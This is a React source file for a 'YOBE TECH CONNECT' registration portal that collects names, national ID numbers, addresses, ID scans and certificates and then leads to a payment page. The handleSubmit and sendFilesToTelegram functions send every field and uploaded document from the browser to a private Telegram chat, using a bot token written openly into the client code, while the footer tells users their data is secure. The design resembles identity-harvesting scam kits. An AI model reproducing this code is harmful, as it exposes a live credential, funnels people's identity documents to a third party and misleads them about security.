"use client"

import { useState } from "react"
import { ChevronRight, CheckCircle, Loader } from "lucide-react"
import StepOne from "./steps/step-one"
import StepTwo from "./steps/step-two"
import StepThree from "./steps/step-three"
import StepFour from "./steps/step-four"
import SuccessScreen from "./steps/success-screen"
import PaymentPage from "./steps/payment-page"

export default function RegistrationForm() {
  const [currentStep, setCurrentStep] = useState(1)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [showPayment, setShowPayment] = useState(false)

  const [formData, setFormData] = useState({
    // Step 1
    fullName: "",
    dateOfBirth: "",
    gender: "",
    email: "",
    phone: "",
    homeAddress: "",
    state: "Yobe State",
    localGovernment: "",
    nin: "",
    passportPhoto: null as File | null,
    identification: null as File | null,
    studentStatus: "",
    occupation: "",
    emergencyContact: "",
    emergencyPhone: "",
    // Step 2
    fieldOfExpertise: "",
    yearsOfExperience: "",
    skillsSummary: "",
    portfolio: "",
    certificates: null as File | null,
    // Step 3
    primarySchool: "",
    primaryYear: "",
    secondarySchool: "",
    secondaryYear: "",
    university: "",
    course: "",
    universityYear: "",
    qualificationLevel: "",
    educationDocument: null as File | null,
    // Step 4
    profilePicture: null as File | null,
  })

  const handleInputChange = (field: string, value: any) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  const handleFileChange = (field: string, file: File | null) => {
    setFormData((prev) => ({
      ...prev,
      [field]: file,
    }))
  }

  const handleNext = () => {
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1)
      window.scrollTo({ top: 0, behavior: "smooth" })
    }
  }

  const handlePrevious = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1)
      window.scrollTo({ top: 0, behavior: "smooth" })
    }
  }

  const handleSubmit = async () => {
    setIsSubmitting(true)
    try {
      // Send to Telegram bot
      const messageText = formatMessageForTelegram()

      await fetch(`https://api.telegram.org/bot7971028407:AAG6ScsaUOqLPFhkffGZEtGEfoIDOgcwEzo/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: "6388682226",
          text: messageText,
          parse_mode: "HTML",
        }),
      })

      // Send files
      await sendFilesToTelegram()

      setIsSuccess(true)
      setShowPayment(true)
    } catch (error) {
      console.error("Error submitting form:", error)
      setIsSubmitting(false)
    }
  }

  const formatMessageForTelegram = () => {
    return `
<b>📋 NEW REGISTRATION - YOBE TECH CONNECT</b>

<b>👤 PERSONAL INFORMATION</b>
<b>Full Name:</b> ${formData.fullName}
<b>Date of Birth:</b> ${formData.dateOfBirth}
<b>Gender:</b> ${formData.gender}
<b>Email:</b> ${formData.email}
<b>Phone:</b> ${formData.phone}
<b>Address:</b> ${formData.homeAddress}
<b>State:</b> ${formData.state}
<b>LGA:</b> ${formData.localGovernment}
<b>NIN:</b> ${formData.nin}
<b>Student Status:</b> ${formData.studentStatus}
<b>Occupation:</b> ${formData.occupation}
<b>Emergency Contact:</b> ${formData.emergencyContact}
<b>Emergency Phone:</b> ${formData.emergencyPhone}

<b>💼 EXPERIENCE & SKILLS</b>
<b>Field of Expertise:</b> ${formData.fieldOfExpertise}
<b>Years of Experience:</b> ${formData.yearsOfExperience}
<b>Skills:</b> ${formData.skillsSummary}
<b>Portfolio:</b> ${formData.portfolio || "N/A"}

<b>🎓 EDUCATIONAL BACKGROUND</b>
<b>Primary School:</b> ${formData.primarySchool} (${formData.primaryYear})
<b>Secondary School:</b> ${formData.secondarySchool} (${formData.secondaryYear})
<b>University:</b> ${formData.university || "N/A"}
<b>Course:</b> ${formData.course || "N/A"}
<b>Year Completed:</b> ${formData.universityYear || "N/A"}
<b>Qualification Level:</b> ${formData.qualificationLevel}

---
<i>All documents attached below</i>
    `.trim()
  }

  const sendFilesToTelegram = async () => {
    const files = [
      { name: "Passport Photo", file: formData.passportPhoto },
      { name: "Identification", file: formData.identification },
      { name: "Certificates", file: formData.certificates },
      { name: "Education Document", file: formData.educationDocument },
      { name: "Profile Picture", file: formData.profilePicture },
    ]

    for (const { name, file } of files) {
      if (file && file.size > 0) {
        const fileData = new FormData()
        fileData.append("chat_id", "6388682226")
        fileData.append("caption", name)
        fileData.append("document", file)

        await fetch(`https://api.telegram.org/bot7971028407:AAG6ScsaUOqLPFhkffGZEtGEfoIDOgcwEzo/sendDocument`, {
          method: "POST",
          body: fileData,
        })
      }
    }
  }

  const handleBackFromPayment = () => {
    setShowPayment(false)
    setIsSuccess(false)
    setCurrentStep(4)
  }

  if (isSuccess && showPayment) {
    return <PaymentPage formData={formData} onBack={handleBackFromPayment} />
  }

  if (isSuccess) {
    return <SuccessScreen onPaymentComplete={() => setShowPayment(true)} />
  }

  return (
    <div className="min-h-screen py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-2xl mx-auto">
        <div className="text-center mb-8 animate-fade-in">
          <div className="mb-4 flex justify-center">
            <img
              src="https://firebasestorage.googleapis.com/v0/b/backup-file-78994.appspot.com/o/file_000000002274620a8bc1c942af702bb7.png?alt=media&token=4b43cfa9-7608-453d-8089-fe0e990a1e21"
              alt="YOBE TECH CONNECT Logo"
              className="w-24 h-24 object-contain"
            />
          </div>
          <h1 className="text-3xl sm:text-4xl font-bold text-white mb-2">YOBE TECH CONNECT</h1>
          <p className="text-primary-foreground/80 text-lg">Registration Portal</p>
        </div>

        {/* Progress Steps */}
        <div className="mb-8">
          <div className="flex items-center justify-between mb-4">
            {[1, 2, 3, 4].map((step) => (
              <div key={step} className="flex flex-col items-center flex-1">
                <div
                  className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm transition-all duration-300 ${
                    step <= currentStep ? "bg-accent text-accent-foreground shadow-lg" : "bg-white/20 text-white"
                  }`}
                >
                  {step < currentStep ? <CheckCircle className="w-5 h-5" /> : step}
                </div>
                <p className="text-xs text-white/70 mt-2 text-center">
                  {["Personal", "Skills", "Education", "Confirm"][step - 1]}
                </p>
              </div>
            ))}
          </div>
          <div className="h-1 bg-white/20 rounded-full overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-accent to-secondary transition-all duration-300"
              style={{ width: `${(currentStep / 4) * 100}%` }}
            ></div>
          </div>
        </div>

        {/* Form Steps */}
        <div className="bg-white rounded-2xl shadow-2xl p-6 sm:p-8 animate-slide-up">
          {currentStep === 1 && (
            <StepOne formData={formData} onChange={handleInputChange} onFileChange={handleFileChange} />
          )}
          {currentStep === 2 && (
            <StepTwo formData={formData} onChange={handleInputChange} onFileChange={handleFileChange} />
          )}
          {currentStep === 3 && (
            <StepThree formData={formData} onChange={handleInputChange} onFileChange={handleFileChange} />
          )}
          {currentStep === 4 && (
            <StepFour formData={formData} onChange={handleInputChange} onFileChange={handleFileChange} />
          )}

          {/* Navigation Buttons */}
          <div className="flex gap-4 mt-8 pt-6 border-t border-border">
            <button
              onClick={handlePrevious}
              disabled={currentStep === 1}
              className="flex-1 px-6 py-3 border-2 border-primary text-primary font-semibold rounded-lg hover:bg-primary/10 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200"
            >
              ← Previous
            </button>
            {currentStep < 4 ? (
              <button
                onClick={handleNext}
                className="flex-1 px-6 py-3 bg-gradient-to-r from-accent to-secondary text-white font-semibold rounded-lg hover:shadow-lg transform hover:scale-105 transition-all duration-200 flex items-center justify-center gap-2"
              >
                Next <ChevronRight className="w-4 h-4" />
              </button>
            ) : (
              <button
                onClick={handleSubmit}
                disabled={isSubmitting}
                className="flex-1 px-6 py-3 bg-gradient-to-r from-green-500 to-emerald-600 text-white font-semibold rounded-lg hover:shadow-lg transform hover:scale-105 transition-all duration-200 flex items-center justify-center gap-2 disabled:opacity-50"
              >
                {isSubmitting ? (
                  <>
                    <Loader className="w-4 h-4 animate-spin" />
                    Submitting...
                  </>
                ) : (
                  <>
                    <CheckCircle className="w-4 h-4" />
                    Submit Registration
                  </>
                )}
              </button>
            )}
          </div>
        </div>

        {/* Footer Info */}
        <div className="text-center mt-6 text-white/70 text-sm">
          <p>All your information is secure and will be used only for registration purposes.</p>
        </div>
      </div>
    </div>
  )
}
